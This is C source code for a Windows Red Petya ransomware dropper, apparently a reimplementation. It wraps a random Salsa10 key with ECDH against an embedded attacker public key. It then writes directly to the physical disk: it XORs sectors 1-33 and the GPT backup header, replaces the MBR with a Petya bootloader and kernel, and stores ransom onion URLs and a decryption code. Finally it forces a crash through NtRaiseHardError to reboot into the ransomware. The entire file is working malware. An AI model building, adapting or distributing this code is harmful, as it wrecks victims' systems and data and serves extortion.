#include <Windows.h>
#include <stdint.h>
#include "openssl/evp.h"
#include "openssl/ecdh.h"
#include "openssl/sha.h"
#include "openssl/aes.h"
#include "data.h"
#include "base58.h"
#include "endian.h"

#pragma comment(lib, "libeay32.lib")
#pragma comment(lib, "ssleay32.lib")

//Janus public key
uint8_t PubKeyA[] = {
	0x04, 0xC4, 0x80, 0xAF, 0x98, 0x2B, 0x11, 0x26, 0x9C, 0xB4, 0x38, 0xA0,
	0x1C, 0x46, 0x79, 0xA8, 0x32, 0x9B, 0x5A, 0x5F, 0x4E, 0x80, 0x0C, 0x86,
	0x9E, 0xA3, 0xD5, 0x26, 0x77, 0xF3, 0x26, 0x1E, 0xC8, 0x8D, 0xD1, 0x71,
	0xEC, 0xA5, 0xA9, 0x06, 0x6F, 0x4D, 0x8F, 0x26, 0xDC, 0xA6, 0x48, 0xFE,
	0xF9
};

void aes_ecb_encrypt_chunk(uint8_t enc_buf[16], uint8_t *key_bytes)
{
    AES_KEY key;
    AES_set_encrypt_key(key_bytes, 256, &key);
    AES_ecb_encrypt(enc_buf, enc_buf, &key, AES_ENCRYPT);
}
void xor_buffer(uint8_t *buffer, size_t buffer_size, uint8_t *key, size_t key_size)
{
    for (size_t i = 0; i < buffer_size && i < key_size; i++) {
        buffer[i] ^= key[i];
    }
}
void sha512(uint8_t *in_buffer, size_t in_buffer_len, uint8_t out_hash[SHA512_DIGEST_LENGTH])
{
    SHA512_CTX sha512;
    SHA512_Init(&sha512);
    SHA512_Update(&sha512, in_buffer, in_buffer_len);
    SHA512_Final(out_hash, &sha512);
}
void sha256(uint8_t *in_buffer, size_t in_buffer_len, uint8_t out_hash[SHA256_DIGEST_LENGTH])
{
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, in_buffer, in_buffer_len);
    SHA256_Final(out_hash, &sha256);
}
size_t get_expanded_size(uint8_t *secret, size_t secret_len)
{
    uint32_t first_dword = 0;
    memcpy(&first_dword, secret, sizeof(uint32_t));
    first_dword = bbp_swap32(first_dword);

    uint32_t counter = 0x20;
    uint32_t curr = 0;
    size_t dif = 0;
    do {
        curr = first_dword;
        curr >>= (counter - 1);
        if (curr & 1) {
            break;
        }
        counter--;
        dif++;
    } while (counter);

    return (secret_len * 8) - dif;
}
uint8_t *expand_secret(uint8_t* secret, size_t out_secret_len)
{
    const size_t secret_data_size = get_expanded_size(secret, out_secret_len);
    uint8_t *secret_data = (uint8_t *)OPENSSL_malloc(secret_data_size);
    memset(secret_data, 0, secret_data_size);

    size_t secret_offset = secret_data_size - out_secret_len;

    memcpy(secret_data + secret_offset, secret, out_secret_len);

    return secret_data;
}

static unsigned char Base54Alphabet[] = "123456789abcdefghijkmnopqrstuvwxABCDEFGHJKLMNPQRSTUVWX";

uint64_t uint8to64(uint8_t fouruint8[8]) {
	return *(uint64_t*)fouruint8;
	//return((uint64_t)fouruint8[7] << 56) | ((uint64_t)fouruint8[6] << 48) | ((uint64_t)fouruint8[5] << 40) | ((uint64_t)fouruint8[4] << 32) |
		//((uint64_t)fouruint8[3] << 24) | ((uint64_t)fouruint8[2] << 16) | ((uint64_t)fouruint8[1] << 8) | ((uint64_t)fouruint8[0]);;
}

void hard_reboot() 
{
	HANDLE hProc;
	HANDLE TokenHandle;
	TOKEN_PRIVILEGES NewState;

	hProc = GetCurrentProcess();
	OpenProcessToken(hProc, 0x28u, &TokenHandle);
	LookupPrivilegeValueA(0, "SeShutdownPrivilege", (PLUID)NewState.Privileges);
	NewState.PrivilegeCount = 1;
	NewState.Privileges[0].Attributes = 2;

	AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);

	HMODULE ntdll = GetModuleHandleA("NTDLL.DLL");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	DWORD tmp;
	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000350, 0, 0, 0, 6, &tmp);
}

void GenerateRandomBuffer(BYTE *buffer, DWORD dwLen)
{
	HCRYPTPROV prov;
	CryptAcquireContextA(&prov, 0, 0, 1u, 0xF0000000);
	CryptGenRandom(prov, dwLen, buffer);
	CryptReleaseContext(prov, 0);
}
void ReadSector(char hHandle[18], INT iSectorCount, BYTE* cBuffer, DWORD nBytesToRead)
{
	HANDLE PhysicalDrive = CreateFileA(hHandle, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	DWORD lpTemporary;
	SetFilePointer(PhysicalDrive, iSectorCount * 512, 0, FILE_BEGIN);

	ReadFile(PhysicalDrive, cBuffer, nBytesToRead, &lpTemporary, 0);

	CloseHandle(PhysicalDrive);
}

void WriteSector(char hHandle[18], INT iSectorCount, BYTE *cBuffer, DWORD nBytesToWrite)
{
	HANDLE PhysicalDrive = CreateFileA(hHandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, 0);
	DWORD lpTemporary;
	SetFilePointer(PhysicalDrive, iSectorCount * 512, 0, FILE_BEGIN);

	WriteFile(PhysicalDrive, cBuffer, nBytesToWrite, &lpTemporary, 0);

	CloseHandle(PhysicalDrive);
}

void ReadSectorGPT(char hHandle[18], LARGE_INTEGER iSectorCount, BYTE* cBuffer, DWORD nBytesToRead)
{
	HANDLE PhysicalDrive = CreateFileA(hHandle, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	DWORD lpTemporary;
	SetFilePointerEx(PhysicalDrive, iSectorCount, 0, FILE_BEGIN);

	ReadFile(PhysicalDrive, cBuffer, nBytesToRead, &lpTemporary, 0);

	CloseHandle(PhysicalDrive);
}

void WriteSectorGPT(char hHandle[18], LARGE_INTEGER iSectorCount, BYTE *cBuffer, DWORD nBytesToWrite)
{
	HANDLE PhysicalDrive = CreateFileA(hHandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, 0);
	DWORD lpTemporary;
	SetFilePointerEx(PhysicalDrive, iSectorCount, 0, FILE_BEGIN);

	WriteFile(PhysicalDrive, cBuffer, nBytesToWrite, &lpTemporary, 0);

	CloseHandle(PhysicalDrive);
}
// Red Petya key expansion algorithm
void key_encode_and_expand(BYTE key[16], BYTE outKey[32])
{
	for (int i = 0; i < 16; i++)
	{
		BYTE uc = key[i];
		outKey[i * 2 + 0] = uc + 0x7A; // uc + 'z'
		outKey[i * 2 + 1] = uc * 2;
	}
}

int _stdcall WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmd, int nCmdShow)
{
	// Generate random Salsa10 key using CryptGenRandom
	uint8_t key[16];
	uint8_t salsa10key[16];
	GenerateRandomBuffer(salsa10key, 16);
	for(int i = 0; i < 16; i++) { salsa10key[i] = Base54Alphabet[salsa10key[i] % 54]; }

	// Copy the generated salsa10key into key buffer
	memcpy(key + 0, salsa10key + 0, 16);
	
	// Public key cryptography secp192k1 using OpenSSL library
	const unsigned char* pub_key_buf;
	EC_KEY *VictimPrivateKey;
	const EC_POINT *MasterPubKey;
	const EC_POINT *VictimPubKey;
	EC_GROUP *secp192k1_group;
	unsigned char victim_pub_key_char[49];
	
	// Set our master public key
	EC_KEY *PeerPublicKey = EC_KEY_new_by_curve_name(NID_secp192k1);
	EC_KEY_set_conv_form(PeerPublicKey, POINT_CONVERSION_UNCOMPRESSED);
	pub_key_buf = PubKeyA;
	o2i_ECPublicKey(&PeerPublicKey, &pub_key_buf, 49);

	// Generate victim keypair on secp192k1 curve
	EC_KEY *VictimKeyPair = EC_KEY_new_by_curve_name(NID_secp192k1);
	EC_KEY_generate_key(VictimKeyPair);
	EC_KEY_set_conv_form(VictimKeyPair, POINT_CONVERSION_UNCOMPRESSED);
	VictimPrivateKey = VictimKeyPair;

	VictimPubKey = EC_KEY_get0_public_key(VictimKeyPair);

	secp192k1_group = EC_GROUP_new_by_curve_name(NID_secp192k1);

	// Convert victim public key to raw format
	BIGNUM *victim_pub;
	//
	victim_pub = EC_POINT_point2bn(secp192k1_group, VictimPubKey, POINT_CONVERSION_UNCOMPRESSED, NULL, NULL);
	BN_bn2bin(victim_pub, victim_pub_key_char);

	// Set our Master Public Key
	MasterPubKey = EC_KEY_get0_public_key(PeerPublicKey);

	// allocate the memory for the shared secret
	const size_t secret_len = 0x40;
	uint8_t *secret = (uint8_t *)OPENSSL_malloc(secret_len);
	memset(secret, 0, secret_len);

	// Calculate the shared secret based on ECDH and secp192k1 curve
	size_t out_secret_len = ECDH_compute_key(secret, secret_len, MasterPubKey, VictimPrivateKey, NULL);

	// Expand the secret
	uint8_t *to_hash = expand_secret(secret, out_secret_len);
	size_t to_hash_size = get_expanded_size(secret, out_secret_len);

	uint8_t out_buffer[SHA512_DIGEST_LENGTH];

	// Hash the expanded secret with SHA512
	sha512(to_hash, to_hash_size, out_buffer);

	// Free secret
	OPENSSL_free(secret);
	OPENSSL_free(to_hash);

	// Use the first 32 byte of SHA512 hash as AES 256 ECB key
	uint8_t AESKEY[32];
	memcpy(AESKEY + 0, out_buffer + 0, 32);

	// XOR the Salsa10 key with the victim public key
	xor_buffer(salsa10key, 16, victim_pub_key_char, 49);

	// encrypt the result with AES 256 ECB using the first 32 bytes of SHA512 hash of secret as key
	aes_ecb_encrypt_chunk(salsa10key, AESKEY);

	// Destroy SHA512 hash of secret buffer
	memset(out_buffer, 0x00, SHA512_DIGEST_LENGTH);
	// Destroy AES KEY
	memset(AESKEY, 0x00, 32);

	// Buffer for base58 encoded victim public key and encrypted Salsa10 key
	uint8_t ec_session_data_b58[88];

	// Put the victim public key and encrypted salsa10 key in a buffer
	uint8_t ec_session_data[65];
	memcpy(ec_session_data + 0, victim_pub_key_char, 49);
	memcpy(ec_session_data + 49, salsa10key, 16);

	// Base58 encode the victim public key and encrypted salsa10 key
	base58_encode((const char*)ec_session_data, 65, ec_session_data_b58, 88);

	// SHA256 hash buffer
	uint8_t digest[SHA256_DIGEST_LENGTH];

	// Calculate SHA256 hash of base58 encoded victim public key and encrypted salsa10 key
	sha256(ec_session_data_b58, 88, digest);

	// Calculate check1 and check2 using this formula
	BYTE a = digest[0] & 0xF;
	BYTE b = (digest[0] & 0xF) < 10;
	BYTE check1 = (digest[0] >> 4) + 0x57 + ((digest[0] >> 4) < 10 ? 0xD9 : 0);
	BYTE check2 = a + 0x57 + (b ? 0xD9 : 0);

	// Buffer of personal decryption code
	uint8_t ec_data[90];

	//Put check1, check2 and base58 encoded victim public key and encrypted salsa10 key in this buffer
	memcpy(ec_data + 0, &check1, 1);
	memcpy(ec_data + 1, &check2, 1);
	memcpy(ec_data + 2, ec_session_data_b58, 88);
	
	//
	DWORD wb;
	VOLUME_DISK_EXTENTS diskExtents; // disk extents buffer
	char buffer[6];
	char system[MAX_PATH];
	memset(system, 0x00, sizeof(system));
	GetSystemDirectoryA(system, sizeof(system)); // Get system directory to get the drive letter on which OS is installed on
	char path[] = "\\\\.\\";
	char NUL[]="\0";

	// Make buffer that contains \\.\ + logical drive letter + :
	memcpy(buffer + 0, path + 0, 4);
	memcpy(buffer + 4, system + 0, 1);
	memcpy(buffer + 5, ":" + 0, 1);
	memcpy(buffer + 6, NUL + 0, 1);

	// Open the Logical Drive in which OS is installed in
	HANDLE LogicalDrive = CreateFileA(buffer, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	// Exit if logical drive is not accessible
	if (LogicalDrive == INVALID_HANDLE_VALUE){
		ExitProcess(0);
	}
 
	// Get the Logical Drive disk extents
	DeviceIoControl(LogicalDrive, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, 0, 0, &diskExtents, sizeof(diskExtents), &wb, 0);

	// Close Logical drive handle
	CloseHandle(LogicalDrive);

	// If the OS partition starts before sector 60 on hard drive then stop the infection process
	if(diskExtents.Extents[0].StartingOffset.QuadPart / 512 < 0x3C) { ExitProcess(0); } else {
	
	char physicaldevice[] = "\\\\.\\PhysicalDrive";
 
	// buffer that will contain \\.\PhysicalDrive + disknumber
	char buf[18];

	// convert disk number to decimal number
	__asm{

		add diskExtents.Extents[0].DiskNumber, 30h
	}

	// Make buffer that will contains \\.\PhysicalDrive + disknumber
	memcpy(buf + 0, physicaldevice, 17);
	memcpy(buf + 17, &diskExtents.Extents[0].DiskNumber, 1);
	memcpy(buf + 18, NUL + 0, 1);

	// Open primary hard disk
	HANDLE PhysicalDrive = CreateFileA(buf, GENERIC_READ | 0x100000, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	// Exit if hard disk is not accessible
	if (PhysicalDrive == INVALID_HANDLE_VALUE){
		ExitProcess(0);
	}

	BYTE XORMBR[512]; // MBR XORed with 0x37 byte buffer
	BYTE Buffer[512]; // sector 1-33 buffer
	BYTE sector54Buffer[512]; // sector 54 buffer
	BYTE sector55Buffer[512]; // sector 55 buffer
	BYTE NewMbr[512]; // NewMbr buffer
	BYTE OldMbr[512]; // Original MBR buffer
	char foronion[] = {0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20}; //new line for second onion url

	memset(sector54Buffer, 0x00, 512); // Fill sector 54 buffer with 0x00

	BYTE salsakey[32]; // Salsa10 key encoded using custom algorithm

	key_encode_and_expand(key, salsakey); //expand the random 16 byte key into 32 byte encoded key using custom algortithm(WARNING: This algorithm is reversible!)
	memset(key, 0x00, 16); // destroy salsa10 key

	char onion1[] = "http://petya37h5tbhyvki.onion/"; //Red Petya onion url 1
	char onion2[] = "http://petya5koahtsf7sv.onion/"; //Red Petya onion url 2
	
	// Generate 6 random chars that are added after onion urls
	BYTE random[6];
	GenerateRandomBuffer(random, 6);
	for(int i = 0; i < 6; i++) { random[i] = alphabet[random[i] % 58]; }

	// Generate random 8 byte nonce using CryptGenRandom
	BYTE nonce[8];
	GenerateRandomBuffer(nonce, 8);

	//Make sector 54 buffer containing, 32 byte encoded salsa10key, 8 byte random nonce, onion urls and personal decryption code
	//Personal decryption code is encrypted random salsa10 key using public key cryptography secp192k1 based on petya authors Public key and base58 encoded
	memcpy(sector54Buffer + 1, salsakey, 32);
	memcpy(sector54Buffer + 33, nonce, 8);
	memcpy(sector54Buffer + 41, onion1, 30);
	memcpy(sector54Buffer + 71, random, 6);
	memcpy(sector54Buffer + 77, foronion, 6);
	memcpy(sector54Buffer + 83, onion2, 30);
	memcpy(sector54Buffer + 113, random, 6);
	memcpy(sector54Buffer + 169, ec_data, 90);

	memset(salsakey, 0x00, 32); // destroy encoded salsa10 key too

	memset(sector55Buffer, 0x37, 512); // Fill sector 55(verifaction sector) buffer with 0x37

	//Get the harddisk info
	PARTITION_INFORMATION_EX info;
	DeviceIoControl(PhysicalDrive, IOCTL_DISK_GET_PARTITION_INFO_EX, 0, 0, &info, sizeof(info), &wb, 0);
	CloseHandle(PhysicalDrive);
	
	// IF DISK IS MBR
	if(info.PartitionStyle == PARTITION_STYLE_MBR)
	{
		ReadSector(buf, 0, XORMBR, 512); // Read original MBR from sector 0
		for (int i = 0; i < 512; i++)XORMBR[i] ^= 0x37; // XOR every byte of original MBR with 0x37

		// Read, XOR every byte with 0x37 and write back sector 1-33
		for (int i = 1; i <= 33; i++)
		{
			ReadSector(buf, i, Buffer, 512);
			for (int j = 0; j < 512; j++)Buffer[j] ^= 0x37;
			WriteSector(buf, i, Buffer, 512);
		}

		// Construct Red Petya MBR with disk id and partition table from Original MBR in it
		ReadSector(buf, 0, OldMbr, 512);
		memcpy(NewMbr,bootloader,512);
		memcpy(NewMbr + 440, OldMbr + 440, 70);

		// Write Red Petya MBR to sector 0
		WriteSector(buf, 0, NewMbr, 512);

		// Write Red Petya 16 bit kernel to sector 34-50
		WriteSector(buf, 34, kernel, sizeof(kernel));
		
		// Write configuration buffer to sector 54
		WriteSector(buf, 54, sector54Buffer, 512);

		// Write verification sector to sector 55
		WriteSector(buf, 55, sector55Buffer, 512);

		// Write original MBR XORed with 0x37 to sector 56
		WriteSector(buf, 56, XORMBR, 512);

		// Call NtRaiseHardError with code 0xc0000350(STATUS_HOST_DOWN) to cause BSOD
		hard_reboot();
	}
	// IF DISK IS GPT
	// Red Petya GPT Support will only work if UEFI supports Legacy boot
	else if(info.PartitionStyle == PARTITION_STYLE_GPT)
	{
		// Disk Geometry buffer
		DISK_GEOMETRY DiskGeometry;

		// Open PrimaryHardDrive again.
		HANDLE PrimaryHardDrive = CreateFileA(buf, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

		// Exit if PrimaryHardDrive is not accessible
		if (PrimaryHardDrive == INVALID_HANDLE_VALUE){
			ExitProcess(0);
		}

		// Get PrimaryHardDrive Disk Geometry
		DeviceIoControl(PrimaryHardDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY, 0, 0, &DiskGeometry, sizeof(DiskGeometry), &wb, 0);

		// Close handle
		CloseHandle(PrimaryHardDrive);

		ReadSector(buf, 0, XORMBR, 512); // Read original MBR from sector 0
		for (int i = 0; i < 512; i++)XORMBR[i] ^= 0x37; // XOR every byte of original MBR with 0x37
		
		BYTE gpt[512]; // Buffer for Backup GPT header
		BYTE firstLBA[512]; //FIRST LBA
		uint8_t backup_lba[8]; //LAST LBA

		ReadSector(buf, 1, firstLBA, 512); // Read GPT Header from sector 1

		memcpy(backup_lba + 0, firstLBA + 32, 8); // Backup GPT Header location is stored in Primary GPT Header and is 8 bytes long starting at offset 0x20(32 decimal)

		// To get the exact offset of Backup GPT Header multiply the Backup GPT Header location with sector size
		LARGE_INTEGER number;
		number.QuadPart = (ULONGLONG)uint8to64(backup_lba)*(ULONGLONG)512;

		// Encrypt the Backup GPT Header by XORing it with byte 0x37
		for (int i = 1; i <= 33; i++)
		{
			ReadSectorGPT(buf, number, gpt, 512);
			for (int j = 0; j < 512; j++)gpt[j] ^= 0x37;
			WriteSectorGPT(buf, number, gpt, 512);
			number.QuadPart-=(ULONGLONG)512;
		}

		// To make the UEFI firmware boot the Red Petya bootloader we need to make a MBR partition table that represents the whole drive
		// This partition will start at sector 128 of the drive until the last sector -128 i guess?
		// To tell Red Petya kernel that the disk is GPT, the disk id will be set to 0x37373737
		char diskID[] = {0x37, 0x37, 0x37, 0x37}; // Disk ID
		BYTE bootflag[] = {0x80}; // Partition is bootable
		//Start CHS Values
		DWORD StartCylinder = 128 / (DiskGeometry.TracksPerCylinder * DiskGeometry.SectorsPerTrack); // Calculate partition StartCylinder
		DWORD temp = 128 - (StartCylinder * DiskGeometry.TracksPerCylinder * DiskGeometry.SectorsPerTrack);
		DWORD StartHead = temp / DiskGeometry.SectorsPerTrack; // Calculate partition StartHead
		DWORD StartSector = temp % DiskGeometry.SectorsPerTrack + 1; // Calculate partition StartSector
		BYTE SystemId[] = {0x07}; // Partition is NTFS
		//LBA values
		DWORD RelativeSector = 128; // Partition RelativeSector is sector 128 this means this partition starts at sector 128
		DWORD TotalSectors = (DWORD)uint8to64(backup_lba) -128; // Total Sectors of this partition in LBA = LastSector - 128
		//End CHS values
		DWORD EndCylinder = TotalSectors / (DiskGeometry.TracksPerCylinder * DiskGeometry.SectorsPerTrack); //Calculate partition EndCylinder
		DWORD remainder = TotalSectors - (EndCylinder * DiskGeometry.TracksPerCylinder * DiskGeometry.SectorsPerTrack);
		DWORD EndHead = remainder / DiskGeometry.SectorsPerTrack; // Calculate partition EndHead
		DWORD EndSector = remainder % DiskGeometry.SectorsPerTrack + 1; // Calculate partition EndSector

		// Create a buffer that will contain Red Petya bootloader, Disk ID, as well as new partition entry in the partition table that represents the whole drive
		memcpy(NewMbr,bootloader,512);
		memcpy(NewMbr + 440, diskID, 4);
		memcpy(NewMbr + 446, bootflag, 1);
		memcpy(NewMbr + 447, &StartHead, 1);
		memcpy(NewMbr + 448, &StartSector, 1);
		memcpy(NewMbr + 449, &StartCylinder, 1);
		memcpy(NewMbr + 450, SystemId, 1);
		memcpy(NewMbr + 451, &EndHead, 1);
		memcpy(NewMbr + 452, &EndSector, 1);
		memcpy(NewMbr + 453, &EndCylinder, 1);
		memcpy(NewMbr + 454, &RelativeSector, 4);
		memcpy(NewMbr + 458, &TotalSectors, 4);
		
		// Read, XOR every byte with 0x37 and write back sector 1-33
		for (int i = 1; i <= 33; i++)
		{
			ReadSector(buf, i, Buffer, 512);
			for (int j = 0; j < 512; j++)Buffer[j] ^= 0x37;
			WriteSector(buf, i, Buffer, 512);
		}
		
		// Write Red Petya MBR to sector 0
		WriteSector(buf, 0, NewMbr, 512);
		
		// Write Red Petya 16 bit kernel to sector 34-50
		WriteSector(buf, 34, kernel, sizeof(kernel));

		// Write configuration buffer to sector 54
		WriteSector(buf, 54, sector54Buffer, 512);

		// Write verification sector to sector 55
		WriteSector(buf, 55, sector55Buffer, 512);

		// Write original MBR XORed with 0x37 to sector 56
		WriteSector(buf, 56, XORMBR, 512);

		// Call NtRaiseHardError with code 0xc0000350(STATUS_HOST_DOWN) to cause BSOD
		hard_reboot();
	}
	}
}